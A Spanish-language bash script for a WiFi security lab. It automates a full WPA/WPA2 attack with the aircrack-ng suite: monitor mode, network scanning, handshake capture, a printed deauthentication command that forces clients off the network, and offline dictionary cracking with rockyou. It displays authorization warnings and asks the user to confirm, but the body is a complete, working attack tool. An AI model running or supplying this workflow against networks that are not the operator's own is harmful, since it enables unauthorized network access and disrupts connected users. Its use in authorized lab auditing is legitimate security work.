#!/usr/bin/env bash
#
# auditar-wifi.sh — Laboratorio de auditoria WPA/WPA2 (captura de handshake + crackeo offline)
# =============================================================================================
#  USO LEGITIMO UNICAMENTE: tu propia red, o una red con AUTORIZACION ESCRITA.
#  Auditar una red ajena sin permiso es delito en casi todos los paises, aunque "sea prueba".
#  Este script esta pensado para un router de laboratorio que TU controlas.
# =============================================================================================
#  Requiere: Kali/Debian con la suite aircrack-ng y un adaptador WiFi con modo monitor+inyeccion.
#  Ejecuta:  sudo ./auditar-wifi.sh
# =============================================================================================
set -euo pipefail

rojo=$'\e[31m'; verde=$'\e[32m'; amar=$'\e[33m'; azul=$'\e[36m'; fin=$'\e[0m'
info(){ echo "${azul}==>${fin} $*"; }
ok(){   echo "${verde}[ok]${fin} $*"; }
aviso(){ echo "${amar}[aviso]${fin} $*"; }
error(){ echo "${rojo}[error]${fin} $*" >&2; }

# ---- 0. root ----
if [[ $EUID -ne 0 ]]; then
  error "Ejecuta con sudo:  sudo $0"
  exit 1
fi

# ---- 1. herramientas ----
info "Comprobando la suite aircrack-ng..."
faltan=()
for t in airmon-ng airodump-ng aireplay-ng aircrack-ng iw; do
  command -v "$t" >/dev/null 2>&1 || faltan+=("$t")
done
if (( ${#faltan[@]} )); then
  error "Faltan: ${faltan[*]}"
  echo   "  Instala:  sudo apt update && sudo apt install -y aircrack-ng iw"
  exit 1
fi
ok "Herramientas presentes."

# ---- 2. autorizacion (barrera explicita) ----
aviso "Este laboratorio solo debe usarse contra TU red o una con permiso ESCRITO."
read -rp "Confirmo que tengo autorizacion sobre la red objetivo [escribe SI]: " permiso
[[ "$permiso" == "SI" ]] || { error "Sin confirmacion. Saliendo."; exit 1; }

# ---- 3. elegir interfaz ----
info "Adaptadores inalambricos detectados:"
mapfile -t ifaces < <(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}')
if (( ${#ifaces[@]} == 0 )); then
  error "No hay adaptador WiFi visible. Comprueba con:  lsusb   e   iw dev"
  exit 1
fi
select iface in "${ifaces[@]}"; do [[ -n "${iface:-}" ]] && break; done
ok "Usando: $iface"

# ---- 4. modo monitor ----
info "Cerrando procesos que interfieren (NetworkManager, wpa_supplicant)..."
airmon-ng check kill >/dev/null 2>&1 || true
info "Activando modo monitor..."
airmon-ng start "$iface" >/dev/null 2>&1
mon=$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | grep -E 'mon' | head -1 || true)
mon=${mon:-${iface}mon}
iw dev "$mon" info >/dev/null 2>&1 || mon="$iface"
ok "Interfaz monitor: $mon"

limpiar(){
  echo
  info "Restaurando modo gestionado y la red..."
  airmon-ng stop "$mon" >/dev/null 2>&1 || true
  systemctl restart NetworkManager >/dev/null 2>&1 || service network-manager restart >/dev/null 2>&1 || true
  ok "Adaptador restaurado. Ya puedes volver a navegar."
}
trap limpiar EXIT

# ---- 5. escaneo ----
carpeta="captura_lab"
mkdir -p "$carpeta"; cd "$carpeta"
aviso "Se abrira el escaner. Localiza TU red, anota su BSSID y CANAL (CH), y pulsa Ctrl-C."
read -rp "Enter para escanear..." _
airodump-ng "$mon" || true

read -rp "BSSID del objetivo (aa:bb:cc:dd:ee:ff): " bssid
read -rp "Canal (CH): " canal
read -rp "Nombre base del archivo de captura [handshake]: " base
base=${base:-handshake}

# ---- 6. captura del handshake ----
echo
info "Voy a capturar en el canal $canal. Deja ESTA ventana abierta."
aviso "Arriba a la derecha veras 'WPA handshake: $bssid' cuando lo consigas."
aviso "Para forzarlo (contra un dispositivo TUYO ya conectado), en OTRA terminal:"
echo   "      sudo aireplay-ng --deauth 5 -a $bssid $mon"
echo   "      (--deauth 5 = 5 paquetes; expulsa brevemente al equipo y este se reconecta,"
echo   "       generando el handshake. No uses numeros altos: solo necesitas la reconexion.)"
read -rp "Enter para empezar (Ctrl-C en cuanto veas el handshake)..." _
airodump-ng --bssid "$bssid" -c "$canal" -w "$base" "$mon" || true

cap=$(ls -t "${base}"*.cap 2>/dev/null | head -1 || true)
[[ -n "$cap" ]] || { error "No se genero ningun .cap. Repite la captura."; exit 1; }

# ---- 7. verificar handshake ----
if aircrack-ng "$cap" 2>/dev/null | grep -qi "1 handshake"; then
  ok "Handshake capturado en: $cap"
else
  aviso "No se detecta un handshake completo. Vuelve a capturar y usa el deauth contra tu equipo."
  exit 1
fi

# ---- 8. crackeo (CPU con aircrack-ng) ----
echo
dicc_def="/usr/share/wordlists/rockyou.txt"
if [[ -f "${dicc_def}.gz" && ! -f "$dicc_def" ]]; then
  info "Descomprimiendo rockyou.txt..."
  gunzip -k "${dicc_def}.gz" || true
fi
read -rp "Diccionario a usar [$dicc_def]: " dicc
dicc=${dicc:-$dicc_def}
[[ -f "$dicc" ]] || { error "No existe el diccionario: $dicc"; exit 1; }

info "Crackeando con aircrack-ng (CPU). Para GPU (mucho mas rapido) mira el LEEME: hashcat modo 22000."
aircrack-ng -w "$dicc" -b "$bssid" "$cap" || true

echo
ok "Terminado. La captura queda en: $(pwd)/$cap"
echo "Si no salio la clave: amplia el diccionario o pasa a hashcat con GPU (LEEME, seccion 6)."
